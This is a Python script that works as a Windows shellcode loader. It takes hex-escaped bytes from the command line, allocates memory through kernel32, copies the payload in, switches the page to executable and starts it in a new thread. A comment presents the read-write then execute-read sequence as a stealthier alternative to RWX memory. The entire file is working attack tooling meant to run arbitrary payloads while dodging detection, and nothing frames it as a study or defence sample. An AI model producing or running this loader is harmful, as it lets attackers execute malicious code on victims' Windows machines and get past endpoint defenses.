#!/usr/bin/env python
import ctypes
import sys
import os

class InjectShellcode():

    def runShellcode(self, shellcode):
        if os.name != 'nt':
            print("Error: This script only runs on Windows.", file=sys.stderr)
            return

        # ShellCode into bytearray
        if isinstance(shellcode, str):
            # Handle common hex escape format or just encode
            if '\\x' in shellcode:
                try:
                    shellcode = bytes([int(x, 16) for x in shellcode.split('\\x') if x])
                except ValueError:
                    shellcode = shellcode.encode('utf-8')
            else:
                shellcode = shellcode.encode('utf-8')
        
        code = bytearray(shellcode)
        
        # Windows Constants
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_READWRITE = 0x04
        PAGE_EXECUTE_READ = 0x20

        # Set up kernel32 functions
        kernel32 = ctypes.windll.kernel32
        
        VirtualAlloc = kernel32.VirtualAlloc
        VirtualAlloc.restype = ctypes.c_void_p
        VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
        
        VirtualProtect = kernel32.VirtualProtect
        VirtualProtect.restype = ctypes.c_int
        VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
        
        RtlMoveMemory = kernel32.RtlMoveMemory
        RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
        
        CreateThread = kernel32.CreateThread
        CreateThread.restype = ctypes.c_void_p
        CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p]
        
        WaitForSingleObject = kernel32.WaitForSingleObject
        WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]

        # 1. Allocate as Read/Write (more stealthy than RWX)
        ptr = VirtualAlloc(None, len(code), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if not ptr:
            print("Error: VirtualAlloc failed.", file=sys.stderr)
            return

        # 2. Copy shellcode
        buf = (ctypes.c_char * len(code)).from_buffer(code)
        RtlMoveMemory(ptr, buf, len(code))
        
        # 3. Change to Execute/Read
        old_protect = ctypes.c_ulong(0)
        if not VirtualProtect(ptr, len(code), PAGE_EXECUTE_READ, ctypes.byref(old_protect)):
            print("Error: VirtualProtect failed.", file=sys.stderr)
            return
        
        # 4. Run thread
        print(f"Executing shellcode at {hex(ptr)}...")
        ht = CreateThread(None, 0, ptr, None, 0, None)
        if not ht:
            print("Error: CreateThread failed.", file=sys.stderr)
            return
            
        WaitForSingleObject(ht, 0xFFFFFFFF)


if __name__ == '__main__':
    try:
        shellcode = sys.argv[1]
        process = InjectShellcode()
        process.runShellcode(shellcode)
    except IndexError:
        print('Usage: inject_shellcode.py "\\xbe\\xba\\xfe\\xca\\xef\\xbe\\xad\\xde"')
        sys.exit(1)
